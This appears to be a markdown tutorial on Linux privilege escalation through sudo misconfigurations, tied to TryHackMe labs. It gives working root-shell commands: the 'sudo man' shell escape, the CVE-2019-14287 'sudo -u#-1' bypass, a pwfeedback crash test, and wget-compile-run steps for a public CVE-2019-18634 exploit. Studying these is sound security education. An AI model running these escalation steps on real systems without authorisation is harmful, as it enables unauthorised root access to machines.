# Linux Privilege Escalation: SUDO Privileges

## Contents
- [What are we looking for?](#what-are-we-looking-for)
- [Standard Local Enumeration](#standard-local-enumeration)
  - [`sudo -l`](#sudo--l)
  - [Results](#results)
  - [The Vulnerability](#the-vulnerability)
- [The Hack: `sudo man [command]`](#the-hack-sudo-man-command)
- [Security Bypass - CVE-2019-14287](#security-bypass---cve-2019-14287)
- [pwfeedback - CVE-2019-18634](#pwfeedback---cve-2019-18634)

## What are we looking for?
- We are looking for poorly configured binaries (executables) on the compromised Linux system.
  - We can use these binaries to elevate our privileges
- Many binaries in Linux can be used to execute specific commands.
  - If a binary has sudo privileges attached (without a password), you may be able to use that binary to spawn a shell (thus gaining root privs). 

## Standard Local Enumeration

### `sudo -l`
```
cat /etc/passwd     #find out what other users are configured on the system
sudo -l
```
-  `-l` (lowercase "L" for list) list out the sudo commands the current user can run.
-  [From the man page](https://linux.die.net/man/8/sudo): The `-l` (list) option will list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.

### Results
- Assume we found a binary we can run with sudo privileges: `/sur/bin/man`
- And the "NOPASSWD" option has been set
- So we can run that command as root without any password or authentication
- This is a misconfiguration we can exploit (see below).
- Use [GTFOBins](https://gtfobins.github.io/) to look up how to compromise the binary file you and use with sudo.

### The Vulnerability
- The `man` utility (to display "man pages") allows you to spawn a Bash shell via the utility itself.
- The normal way you'd open a man page is `man [command]`.
  - This will open the man page with the current user's privileges.
- But if you can run `/usr/bin/man` with root privs using `sudo` (because it's set with "NOPASSWD"), then you can open a shell as root.
  - Preface the `man` comand with `sudo`. That runs the command with root privileges: `sudo man [command]`
  - And since the system is configured to run `/usr/bin/man` via sudo without a password, you are not prompted for any authentication. 

## [The Hack](https://gtfobins.github.io/gtfobins/man/#sudo): `sudo man [command]`
- Open a man page (any man page) with sudo: `sudo man [command]` 
- It parses out the contents of the man page with "more"
- While the man page is displayed, you can enter commands with the "!"
  - Example:  `!/bin/bash`
  - This is a function of more not of man.
  - [From the more man page](https://man7.org/linux/man-pages/man1/more.1.html): `!command` or `:!command` : Execute command in a subshell.
  - `less` works the same way.
- This results in a Bash session as root (the owner of the man process from which the shell was spawned).

## [Security Bypass](https://www.exploit-db.com/exploits/47502) - CVE-2019-14287
> If you have sudo < 1.8.28 this should work.

1. Check for the user sudo permissions
- You can either run a `sudo -l` or `cat` out the **/etc/sudoers/** file.
- You are looking for this configuration: 
```
# from sudo -l: 
User hacker may run the following commands on kali:
  (ALL, !root) /bin/bash

# or in /etc/sudoers:
hacker ALL=(ALL,!root) /bin/bash
```

2. Exploit: 
- Sudo doesn't check for the existence of the specified user id and executes the with arbitrary user id with the sudo privilege.
- `-u#-1` returns as 0 which is root's id
- And then /bin/bash is executed with root permission:
```
sudo -u#-1 /bin/bash
```

3. [TryHackMe Walk-Through](https://tryhackme.com/r/room/sudovulnsbypass)

## [pwfeedback](https://www.exploit-db.com/exploits/47995) - CVE-2019-18634
> If you have sudo < 1.8.26 this should work.

If pwfeedback is enabled in sudoers, you may be able to escalate privileges through buffer overflow.
- Sudo's pwfeedback option can be used to provide visual feedback when the user is inputting their password.
- For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard Password: prompt disables the echoing of key presses.
- While pwfeedback is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.
- Due to a bug, when the pwfeedback option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow.
- This bug can be triggered even by users not listed in the sudoers file.
- There is no impact unless pwfeedback has been enabled.

1. Check for the configuration: pwfeedback
- Exploiting the bug does not require sudo permissions, merely that pwfeedback be enabled.
- You can try a `sudo -l` or `cat /etc/sudoers` but if you cannot access sudo because of perms, just run sudo command (any command; e.g., `sudo su root`).
- If you get an asterisk everytime you type a letter in for the password, pwfeedback is enabled.
- If sudo is < 1.8.26, then the hack should work.
```
sudo -l
# If the results include pwfeedback, like below, sudo is vulnerable.
Matching Defaults entries for millert on linux-build:
insults, pwfeedback, mail_badpass, mailerpath=/usr/sbin/sendmail

User millert may run the following commands on linux-build:
(ALL : ALL) ALL
```

2. You can check to see if the vulnerability can be exploited with:
```
perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id
```
- If that returns `Password: Segmentation fault`, it is exploitable.
- This perl command does not actually exploit the vulnerability.
  - We use Perl to generate a lot of information which we're then passing into the sudo command as a password using the pipe (|) operator.
  - This doesn't actually give us root permissions -- instead it shows us an error message: Segmentation fault, which basically means that we've tried to access some memory that we weren't supposed to be able to access.
  - This proves that a buffer overflow vulnerability exists, but it doesn't exploit it. 

3. Exploit:
- [Actual Exploit](https://github.com/saleemrashid/sudo-cve-2019-18634) | [TryHackMe Write-Up](https://tryhackme.com/r/room/sudovulnsbof)

```
#Download the C code onto your target machine (because you have to compile on the target machine).
wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/refs/heads/master/exploit.c

# Compile that file on the target machine: 
gcc -o exploit exploit.c 

# Execute it:
./exploit
```
